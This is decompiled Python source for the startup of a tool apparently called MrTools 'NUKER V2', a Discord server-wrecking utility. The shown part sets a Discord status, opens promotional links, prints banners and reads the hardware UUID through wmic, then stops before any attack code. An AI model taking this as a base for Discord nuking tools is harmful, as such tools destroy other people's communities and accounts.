# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: mrcommunity.py
import requests, webbrowser, os, sys, threading, time, json, asyncio, discord, aiohttp, datetime, subprocess
from colorama import Fore
import psutil
from colored import fg, attr
from colorama import Fore, Style
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from pypresence import Presence
client_id = '840720399796928632'
RPC = Presence(client_id)
RPC.connect()
RPC.update(state='NUKER', details='V2', large_image='mr', small_image='xd', start=(time.time()))
webbrowser.open('https://www.youtube.com/watch?v=OYEkaECOBjc')
webbrowser.open('https://www.youtube.com/watch?v=-Kr2g6V0Mi4')
webbrowser.open('https://www.youtube.com/watch?v=ITznaUv3l84')
webbrowser.open('https://www.youtube.com/channel/UCPal-sR7hAsDznromqlUtyw')
webbrowser.open('https://discord.io/mrtools')
date = datetime.datetime.now()
ok = date.strftime('%H:%M:%S')

def close():
    os._exit(0)


def writechar(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)


def Clear():
    os.system('cls')


os.system('cls & title MrTools | discord.io/mrtools')

def Clear():
    os.system('cls')


def clear():
    if sys.platform.startswith('win'):
        os.system('cls')
    else:
        if not sys.platform == 'linux':
            pass
        os.system('clear')


class colors:
    red = fg('#ff004d8')
    reset = attr('reset')
    gray = fg('#7a00ff')
    gray = fg('#7a00ff')


os.system('cls')
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━         \n\n\n\n                                     \n{Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching Service by MrTools.\n")
time.sleep(3)
os.system('cls')
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━    \n\n\n\n \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Service by MrTools.                                         \n· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching Proxies by MrCommunity\n")
time.sleep(3)
os.system('cls')
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━      \n\n\n\n \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Service by MrTools.                                         \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Proxies by MrTools.   \n· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Info{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching Machine by MrTools.\n")
time.sleep(3)
os.system('cls')
hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━     \n\n\n\n \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Service by MrTools.\n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Proxies by MrTools.     \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Info{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Machine by MrTools.    \n· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Watcher{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. 